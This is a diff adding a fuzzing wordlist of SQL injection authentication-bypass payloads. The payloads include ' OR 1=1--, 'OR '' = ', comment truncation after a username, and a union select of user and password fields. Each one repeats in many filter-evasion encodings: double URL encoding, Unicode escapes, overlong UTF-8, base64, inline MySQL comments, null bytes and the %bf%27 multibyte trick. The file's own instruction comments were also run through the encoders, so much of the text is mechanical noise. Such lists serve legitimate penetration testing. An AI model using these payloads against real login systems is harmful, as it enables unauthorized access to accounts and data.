@@ -1,0 +1,586 @@
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+%00
+IyByZWdleCByZXBsYWNlIGFzIG1hbnkgYXMgeW91IGNhbiB3aXRoIHlvdXIgZnV6emVyIGZvciBiZXN0IHJlc3VsdHM6Cg==
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+%2523%2520%2572%2565%2567%2565%2578%2520%2572%2565%2570%256C%2561%2563%2565%2520%2561%2573%2520%256D%2561%256E%2579%2520%2561%2573%2520%2579%256F%2575%2520%2563%2561%256E%2520%2577%2569%2574%2568%2520%2579%256F%2575%2572%2520%2566%2575%257A%257A%2565%2572%2520%2566%256F%2572%2520%2562%2565%2573%2574%2520%2572%2565%2573%2575%256C%2574%2573%253A%250A
+%23%20%72%65%67%65%78%20%72%65%70%6C%61%63%65%20%61%73%20%6D%61%6E%79%20%61%73%20%79%6F%75%20%63%61%6E%20%77%69%74%68%20%79%6F%75%72%20%66%75%7A%7A%65%72%20%66%6F%72%20%62%65%73%74%20%72%65%73%75%6C%74%73%3A%0A
+%u0023%u0020%u0072%u0065%u0067%u0065%u0078%u0020%u0072%u0065%u0070%u006C%u0061%u0063%u0065%u0020%u0061%u0073%u0020%u006D%u0061%u006E%u0079%u0020%u0061%u0073%u0020%u0079%u006F%u0075%u0020%u0063%u0061%u006E%u0020%u0077%u0069%u0074%u0068%u0020%u0079%u006F%u0075%u0072%u0020%u0066%u0075%u007A%u007A%u0065%u0072%u0020%u0066%u006F%u0072%u0020%u0062%u0065%u0073%u0074%u0020%u0072%u0065%u0073%u0075%u006C%u0074%u0073%u003A%u000A
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+%C0%AB%C0%AAregex%C0%AAreplace%C0%AAas%C0%AAmany%C0%AAas%C0%AAyou%C0%AAcan%C0%AAwith%C0%AAyour%C0%AAfuzzer%C0%AAfor%C0%AAbest%C0%AAresults%C0%BA%C0%8A
+%# %r%e%g%e%x %r%e%p%l%a%c%e %a%s %m%a%n%y %a%s %y%o%u %c%a%n %w%i%t%h %y%o%u%r %f%u%z%z%e%r %f%o%r %b%e%s%t %r%e%s%u%l%t%s%:%
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+ and '0having'='0having'
+# regex replace as many as you can with your fuzzer for best results:
+sp_password
+#/**/regex/**/replace/**/as/**/many/**/as/**/you/**/can/**/with/**/your/**/fuzzer/**/for/**/best/**/results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+#%07regex%02replace%0Bas%0Emany%0Fas%0Byou%08can%03with%07your%01fuzzer%02for%0Bbest%05results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+#%09regex%0Creplace%09as%0Dmany%0Aas%09you%09can%09with%0Byour%0Afuzzer%0Afor%0Dbest%0Cresults:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+#+regex+replace+as+many+as+you+can+with+your+fuzzer+for+best+results:
+
+#%09regex%0Areplace%09as%0Amany%0Das%0Cyou%0Acan%0Cwith%0Ayour%09fuzzer%0Afor%09best%09results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# regex replace as many as you can with your fuzzer for best results:
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+%00
+IyA8dXNlci1maWVsZG5hbWU+IDxwYXNzLWZpZWxkbmFtZT4gPHVzZXJuYW1lPiAK
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+%2523%2520%253C%2575%2573%2565%2572%252D%2566%2569%2565%256C%2564%256E%2561%256D%2565%253E%2520%253C%2570%2561%2573%2573%252D%2566%2569%2565%256C%2564%256E%2561%256D%2565%253E%2520%253C%2575%2573%2565%2572%256E%2561%256D%2565%253E%2520%250A
+%23%20%3C%75%73%65%72%2D%66%69%65%6C%64%6E%61%6D%65%3E%20%3C%70%61%73%73%2D%66%69%65%6C%64%6E%61%6D%65%3E%20%3C%75%73%65%72%6E%61%6D%65%3E%20%0A
+%u0023%u0020%u003C%u0075%u0073%u0065%u0072%u002D%u0066%u0069%u0065%u006C%u0064%u006E%u0061%u006D%u0065%u003E%u0020%u003C%u0070%u0061%u0073%u0073%u002D%u0066%u0069%u0065%u006C%u0064%u006E%u0061%u006D%u0065%u003E%u0020%u003C%u0075%u0073%u0065%u0072%u006E%u0061%u006D%u0065%u003E%u0020%u000A
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+%C0%AB%C0%AA%C0%BEuser%C0%AFfieldname%C0%BE%C0%AA%C0%BEpass%C0%AFfieldname%C0%BE%C0%AA%C0%BEusername%C0%BE%C0%AA%C0%8A
+%# %<%u%s%e%r%-%f%i%e%l%d%n%a%m%e%> %<%p%a%s%s%-%f%i%e%l%d%n%a%m%e%> %<%u%s%e%r%n%a%m%e%> %
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+ and '0having'='0having'
+# <user-fieldname> <pass-fieldname> <username> 
+sp_password
+#/**/<user-fieldname>/**/<pass-fieldname>/**/<username>/**/
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+#%05<user-fieldname>%0E<pass-fieldname>%02<username>%01
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+#%0C<user-fieldname>%0A<pass-fieldname>%0D<username>%0D
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+#+<user-fieldname>+<pass-fieldname>+<username>+
+
+#%09<user-fieldname>%09<pass-fieldname>%0D<username>%0D
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# <user-fieldname> <pass-fieldname> <username> 
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+%00
+IyBhbHNvIHRyeSB0byBicnV0ZSBmb3JjZSBhIGxpc3Qgb2YgcG9zc2libGUgdXNlcm5hbWVzLCBpbmNsdWRpbmcgcG9zc2lsZSBhZG1pbiBhY2N0IG5hbWVzCg==
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+%2523%2520%2561%256C%2573%256F%2520%2574%2572%2579%2520%2574%256F%2520%2562%2572%2575%2574%2565%2520%2566%256F%2572%2563%2565%2520%2561%2520%256C%2569%2573%2574%2520%256F%2566%2520%2570%256F%2573%2573%2569%2562%256C%2565%2520%2575%2573%2565%2572%256E%2561%256D%2565%2573%252C%2520%2569%256E%2563%256C%2575%2564%2569%256E%2567%2520%2570%256F%2573%2573%2569%256C%2565%2520%2561%2564%256D%2569%256E%2520%2561%2563%2563%2574%2520%256E%2561%256D%2565%2573%250A
+%23%20%61%6C%73%6F%20%74%72%79%20%74%6F%20%62%72%75%74%65%20%66%6F%72%63%65%20%61%20%6C%69%73%74%20%6F%66%20%70%6F%73%73%69%62%6C%65%20%75%73%65%72%6E%61%6D%65%73%2C%20%69%6E%63%6C%75%64%69%6E%67%20%70%6F%73%73%69%6C%65%20%61%64%6D%69%6E%20%61%63%63%74%20%6E%61%6D%65%73%0A
+%u0023%u0020%u0061%u006C%u0073%u006F%u0020%u0074%u0072%u0079%u0020%u0074%u006F%u0020%u0062%u0072%u0075%u0074%u0065%u0020%u0066%u006F%u0072%u0063%u0065%u0020%u0061%u0020%u006C%u0069%u0073%u0074%u0020%u006F%u0066%u0020%u0070%u006F%u0073%u0073%u0069%u0062%u006C%u0065%u0020%u0075%u0073%u0065%u0072%u006E%u0061%u006D%u0065%u0073%u002C%u0020%u0069%u006E%u0063%u006C%u0075%u0064%u0069%u006E%u0067%u0020%u0070%u006F%u0073%u0073%u0069%u006C%u0065%u0020%u0061%u0064%u006D%u0069%u006E%u0020%u0061%u0063%u0063%u0074%u0020%u006E%u0061%u006D%u0065%u0073%u000A
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+%C0%AB%C0%AAalso%C0%AAtry%C0%AAto%C0%AAbrute%C0%AAforce%C0%AAa%C0%AAlist%C0%AAof%C0%AApossible%C0%AAusernames%C0%AE%C0%AAincluding%C0%AApossile%C0%AAadmin%C0%AAacct%C0%AAnames%C0%8A
+%# %a%l%s%o %t%r%y %t%o %b%r%u%t%e %f%o%r%c%e %a %l%i%s%t %o%f %p%o%s%s%i%b%l%e %u%s%e%r%n%a%m%e%s%, %i%n%c%l%u%d%i%n%g %p%o%s%s%i%l%e %a%d%m%i%n %a%c%c%t %n%a%m%e%s%
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+ and '0having'='0having'
+# also try to brute force a list of possible usernames, including possile admin acct names
+sp_password
+#/**/also/**/try/**/to/**/brute/**/force/**/a/**/list/**/of/**/possible/**/usernames,/**/including/**/possile/**/admin/**/acct/**/names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+#%09also%0Dtry%06to%09brute%06force%0Ea%01list%0Bof%01possible%0Busernames,%08including%0Fpossile%0Dadmin%06acct%01names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+#%0Dalso%0Btry%09to%0Dbrute%09force%0Aa%0Alist%0Bof%09possible%0Dusernames,%0Bincluding%09possile%0Aadmin%0Dacct%0Anames
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+#+also+try+to+brute+force+a+list+of+possible+usernames,+including+possile+admin+acct+names
+
+#%0Calso%0Ctry%0Cto%0Abrute%09force%0Aa%0Clist%0Dof%0Cpossible%09usernames,%0Dincluding%09possile%09admin%0Aacct%09names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+# also try to brute force a list of possible usernames, including possile admin acct names
+
+<username>%EF%BC%87 OR 1=1--
+
+<username>%00%27 OR 1=1--
+
+<username>' OR 1=1--
+%00
+PHVzZXJuYW1lPicgT1IgMT0xLS0K
+<username>' OR 1 BETWEEN 1 AND 1--
+
+<username>' OR 1 LIKE 1--
+
+%253C%2575%2573%2565%2572%256E%2561%256D%2565%253E%2527%2520%254F%2552%2520%2531%253D%2531%252D%252D%250A
+%3C%75%73%65%72%6E%61%6D%65%3E%27%20%4F%52%20%31%3D%31%2D%2D%0A
+%u003C%u0075%u0073%u0065%u0072%u006E%u0061%u006D%u0065%u003E%u0027%u0020%u004F%u0052%u0020%u0031%u003D%u0031%u002D%u002D%u000A
+<username>' OR 1=1--
+
+<username>' OR 1 LIKE 1--
+
+<username>' OR 1=1--
+
+<username>' OR 1=1--
+
+<username>' OR 1=1--
+
+<username>' OR 1=1--
+
+<username>' /*!30349OR 1=1*/--
+
+<username>' /*!00000OR 1=1*/--
+
+<username>' OR 1=1--
+
+<username>' OR 1=1--
+
+%C0%BEusername%C0%BE%C0%AF%C0%AAOR%C0%AA1%C0%BF1%C0%AF%C0%AF%C0%8A
+%<%u%s%e%r%n%a%m%e%>%' %O%R %1%=%1%-%-%
+
+<username>' OR 1=1--
+
+<username>' OR 1=1--
+
+<username>' OR 1=1--
+ and '0having'='0having'
+<username>' OR 1=1--
+-- sp_password
+<username>'/**/OR/**/1=1--
+
+<username>'--etnhtrWAFm%0AOR--MIMilPQLbMS%0A1=1----VqvlRvw%0A
+<username>'%23fqqKJBic%0AOR%23yZKpptf%0A1=1--%23ngalhPpDQ%0A
+<username>'%23aknKhFHP%0AOR%23oWzTqwwKpW%0A1=1--%23SWVzZrzSBG%0A
+<username>'%07OR%031=1--
+
+<username>'%23%0AOR%23%0A1=1--%23%0A
+<username>'%0DOR%0B1=1--
+
+<username>'--%0AOR--%0A1=1----%0A
+<username>'+OR+1=1--
+
+<username>'%0AOR%0C1=1--
+
+<username>' OR 1=1--
+
+<username>%bf%27 OR 1=1--
+
+<username>' OR 1=1--
+
+<username>' OR 1=1--
+
+<username>' OR 1=1--
+
+<username>' OR 1=1--
+
+%EF%BC%87OR %EF%BC%87%EF%BC%87 = %EF%BC%87	Allows authentication without a valid username.
+
+%00%27OR %00%27%00%27 = %00%27	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+%00
+J09SICcnID0gJwlBbGxvd3MgYXV0aGVudGljYXRpb24gd2l0aG91dCBhIHZhbGlkIHVzZXJuYW1lLgo=
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' LIKE '	Allows authentication without a valid username.
+
+%2527%254F%2552%2520%2527%2527%2520%253D%2520%2527%2509%2541%256C%256C%256F%2577%2573%2520%2561%2575%2574%2568%2565%256E%2574%2569%2563%2561%2574%2569%256F%256E%2520%2577%2569%2574%2568%256F%2575%2574%2520%2561%2520%2576%2561%256C%2569%2564%2520%2575%2573%2565%2572%256E%2561%256D%2565%252E%250A
+%27%4F%52%20%27%27%20%3D%20%27%09%41%6C%6C%6F%77%73%20%61%75%74%68%65%6E%74%69%63%61%74%69%6F%6E%20%77%69%74%68%6F%75%74%20%61%20%76%61%6C%69%64%20%75%73%65%72%6E%61%6D%65%2E%0A
+%u0027%u004F%u0052%u0020%u0027%u0027%u0020%u003D%u0020%u0027%u0009%u0041%u006C%u006C%u006F%u0077%u0073%u0020%u0061%u0075%u0074%u0068%u0065%u006E%u0074%u0069%u0063%u0061%u0074%u0069%u006F%u006E%u0020%u0077%u0069%u0074%u0068%u006F%u0075%u0074%u0020%u0061%u0020%u0076%u0061%u006C%u0069%u0064%u0020%u0075%u0073%u0065%u0072%u006E%u0061%u006D%u0065%u002E%u000A
+'OR '' = '	Allows authentication without a valid username.
+
+'OR ''LIKE'	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+'OR /*!30829'' = '	Allows authentication without a valid username.
+*/
+'OR /*!00000'' = '	Allows authentication without a valid username.
+*/
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+%C0%AFOR%C0%AA%C0%AF%C0%AF%C0%AA%C0%BF%C0%AA%C0%AF%C0%8BAllows%C0%AAauthentication%C0%AAwithout%C0%AAa%C0%AAvalid%C0%AAusername%C0%AE%C0%8A
+%'%O%R %'%' %= %'%	%A%l%l%o%w%s %a%u%t%h%e%n%t%i%c%a%t%i%o%n %w%i%t%h%o%u%t %a %v%a%l%i%d %u%s%e%r%n%a%m%e%.%
+
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+ and '0having'='0having'
+'OR '' = '	Allows authentication without a valid username.
+-- sp_password
+'OR/**/''/**/=/**/'	Allows authentication without a valid username.
+
+'OR--FgddrWjT%0A''--ifVnvuHv%0A=--nCrcJedMwFb%0A'--wDqyaCBTazF%0AAllows--FnnNAZpvADaJ%0Aauthentication--hBgKvuMTyRS%0Awithout--cqzVOsoPpHR%0Aa--XYTRzby%0Avalid--PPkknNH%0Ausername.--ZULvZBDkh%0A
+'OR%23vLMgVpilLGKz%0A''%23xfeazY%0A=%23QEfVnAEO%0A'%23NBraxN%0AAllows%23odSyalixSX%0Aauthentication%23FfzvnzlTIAi%0Awithout%23aEHmTLKqpotz%0Aa%23yTgyGZpcz%0Avalid%23VPCIKeBzXSok%0Ausername.%23cQyidIeT%0A
+'OR%23pUVHLFOQse%0A''%23wimXnKYmEK%0A=%23ohKilD%0A'%23AEguezr%0AAllows%23ITRAuzafgN%0Aauthentication%23pYXouvUbZAm%0Awithout%23iUgrVAnPu%0Aa%23aiDpvOrJieHG%0Avalid%23CldxljjGHb%0Ausername.%23ULuNmWMD%0A
+'OR%0E''%0F=%0C'	Allows authentication without a valid username.
+
+'OR%23%0A''%23%0A=%23%0A'%23%0AAllows%23%0Aauthentication%23%0Awithout%23%0Aa%23%0Avalid%23%0Ausername.%23%0A
+'OR%09''%09=%0D'	Allows authentication without a valid username.
+
+'OR--%0A''--%0A=--%0A'--%0AAllows--%0Aauthentication--%0Awithout--%0Aa--%0Avalid--%0Ausername.--%0A
+'OR+''+=+'	Allows authentication without a valid username.
+
+'OR%0C''%0D=%09'	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+%bf%27OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+'OR '' = '	Allows authentication without a valid username.
+
+<username>%EF%BC%87--
+
+<username>%00%27--
+
+<username>'--
+%00
+PHVzZXJuYW1lPictLQo=
+<username>'--
+
+<username>'--
+
+%253C%2575%2573%2565%2572%256E%2561%256D%2565%253E%2527%252D%252D%250A
+%3C%75%73%65%72%6E%61%6D%65%3E%27%2D%2D%0A
+%u003C%u0075%u0073%u0065%u0072%u006E%u0061%u006D%u0065%u003E%u0027%u002D%u002D%u000A
+<username>'--
+
+<username>'--
+
+<username>'--
+
+<username>'--
+
+<username>'--
+
+<username>'--
+
+<username>'--
+
+<username>'--
+
+<username>'--
+
+<username>'--
+
+%C0%BEusername%C0%BE%C0%AF%C0%AF%C0%AF%C0%8A
+%<%u%s%e%r%n%a%m%e%>%'%-%-%
+
+<username>'--
+
+<username>'--
+
+<username>'--
+ and '0having'='0having'
+<username>'--
+-- sp_password
+<username>'--/**/
+<username>'----VItDtOXXCSDR%0A
+<username>'--%23bfwUso%0A
+<username>'--%23PWurfAh%0A
+<username>'--%0C
+<username>'--%23%0A
+<username>'--%0D
+<username>'----%0A
+<username>'--+
+<username>'--%09
+<username>'--
+
+<username>%bf%27--
+
+<username>'--
+
+<username>'--
+
+<username>'--
+
+<username>'--
+
+%EF%BC%87 union select 1, %EF%BC%87<user-fieldname>%EF%BC%87, %EF%BC%87<pass-fieldname>%EF%BC%87 1--
+
+%00%27 union select 1, %00%27<user-fieldname>%00%27, %00%27<pass-fieldname>%00%27 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+%00
+JyB1bmlvbiBzZWxlY3QgMSwgJzx1c2VyLWZpZWxkbmFtZT4nLCAnPHBhc3MtZmllbGRuYW1lPicgMS0tCg==
+' union select 1, '<user-fieldname NOT BETWEEN 0 AND ', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+%2527%2520%2575%256E%2569%256F%256E%2520%2573%2565%256C%2565%2563%2574%2520%2531%252C%2520%2527%253C%2575%2573%2565%2572%252D%2566%2569%2565%256C%2564%256E%2561%256D%2565%253E%2527%252C%2520%2527%253C%2570%2561%2573%2573%252D%2566%2569%2565%256C%2564%256E%2561%256D%2565%253E%2527%2520%2531%252D%252D%250A
+%27%20%75%6E%69%6F%6E%20%73%65%6C%65%63%74%20%31%2C%20%27%3C%75%73%65%72%2D%66%69%65%6C%64%6E%61%6D%65%3E%27%2C%20%27%3C%70%61%73%73%2D%66%69%65%6C%64%6E%61%6D%65%3E%27%20%31%2D%2D%0A
+%u0027%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0031%u002C%u0020%u0027%u003C%u0075%u0073%u0065%u0072%u002D%u0066%u0069%u0065%u006C%u0064%u006E%u0061%u006D%u0065%u003E%u0027%u002C%u0020%u0027%u003C%u0070%u0061%u0073%u0073%u002D%u0066%u0069%u0065%u006C%u0064%u006E%u0061%u006D%u0065%u003E%u0027%u0020%u0031%u002D%u002D%u000A
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' /*!30171union select 1, '<user-fieldname>', '<pass-fieldname>' 1*/--
+
+' /*!00000union select 1, '<user-fieldname>', '<pass-fieldname>' 1*/--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' UNIOUNIONN SELESELECTCT 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+%C0%AF%C0%AAunion%C0%AAselect%C0%AA1%C0%AE%C0%AA%C0%AF%C0%BEuser%C0%AFfieldname%C0%BE%C0%AF%C0%AE%C0%AA%C0%AF%C0%BEpass%C0%AFfieldname%C0%BE%C0%AF%C0%AA1%C0%AF%C0%AF%C0%8A
+%' %u%n%i%o%n %s%e%l%e%c%t %1%, %'%<%u%s%e%r%-%f%i%e%l%d%n%a%m%e%>%'%, %'%<%p%a%s%s%-%f%i%e%l%d%n%a%m%e%>%' %1%-%-%
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+ and '0having'='0having'
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+-- sp_password
+'/**/union/**/select/**/1,/**/'<user-fieldname>',/**/'<pass-fieldname>'/**/1--
+
+'--mYxwaqR%0Aunion--jBvQBQo%0Aselect--RtnfFnMpju%0A1,--KTRcAkmeIwM%0A'<user-fieldname>',--RSpgBDsIhVP%0A'<pass-fieldname>'--UwExEITmfD%0A1----EgUpHZTbUu%0A
+'%23WFqNNRDCR%0Aunion%23pikQMvOAS%0Aselect%23fqkPzqO%0A1,%23fNmgqdowfvL%0A'<user-fieldname>',%23WhdikTipU%0A'<pass-fieldname>'%23fgqlpr%0A1--%23JSTORKWKyM%0A
+'%23LbszDezbn%0Aunion%23ifLybBIoTmR%0Aselect%23yorABx%0A1,%23Xgdmzie%0A'<user-fieldname>',%23gYOZBHolyGAf%0A'<pass-fieldname>'%23GFNNRPW%0A1--%23HkdaEMpq%0A
+'%04union%0Bselect%031,%0A'<user-fieldname>',%0E'<pass-fieldname>'%061--
+
+'%23%0Aunion%23%0Aselect%23%0A1,%23%0A'<user-fieldname>',%23%0A'<pass-fieldname>'%23%0A1--%23%0A
+'%0Aunion%0Bselect%0A1,%0B'<user-fieldname>',%0C'<pass-fieldname>'%0A1--
+
+'--%0Aunion--%0Aselect--%0A1,--%0A'<user-fieldname>',--%0A'<pass-fieldname>'--%0A1----%0A
+'+union+select+1,+'<user-fieldname>',+'<pass-fieldname>'+1--
+
+'%0Dunion%0Aselect%0D1,%09'<user-fieldname>',%0D'<pass-fieldname>'%091--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+%bf%27 union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+
+%EF%BC%87OR 1=1--
+
+%00%27OR 1=1--
+
+'OR 1=1--
+%00
+J09SIDE9MS0tCg==
+'OR 1 BETWEEN 1 AND 1--
+
+'OR 1 LIKE 1--
+
+%2527%254F%2552%2520%2531%253D%2531%252D%252D%250A
+%27%4F%52%20%31%3D%31%2D%2D%0A
+%u0027%u004F%u0052%u0020%u0031%u003D%u0031%u002D%u002D%u000A
+'OR 1=1--
+
+'OR 1 LIKE 1--
+
+'OR 1=1--
+
+'OR 1=1--
+
+'OR 1=1--
+
+'OR 1=1--
+
+'OR /*!305531=1*/--
+
+'OR /*!000001=1*/--
+
+'OR 1=1--
+
+'OR 1=1--
+
+%C0%AFOR%C0%AA1%C0%BF1%C0%AF%C0%AF%C0%8A
+%'%O%R %1%=%1%-%-%
+
+'OR 1=1--
+
+'OR 1=1--
+
+'OR 1=1--
+ and '0having'='0having'
+'OR 1=1--
+-- sp_password
+'OR/**/1=1--
+
+'OR--LmbgtvgDSktd%0A1=1----FaXTYxtfEDFV%0A
+'OR%23fPrHYHuwVKz%0A1=1--%23yNleQAebhbfS%0A
+'OR%23FSVOQq%0A1=1--%23hjJoiLLYEF%0A
+'OR%0E1=1--
+
+'OR%23%0A1=1--%23%0A
+'OR%0B1=1--
+
+'OR--%0A1=1----%0A
+'OR+1=1--
+
+'OR%0C1=1--
+
+'OR 1=1--
+
+%bf%27OR 1=1--
+
+'OR 1=1--
+
+'OR 1=1--
+
+'OR 1=1--
+
+'OR 1=1--
+
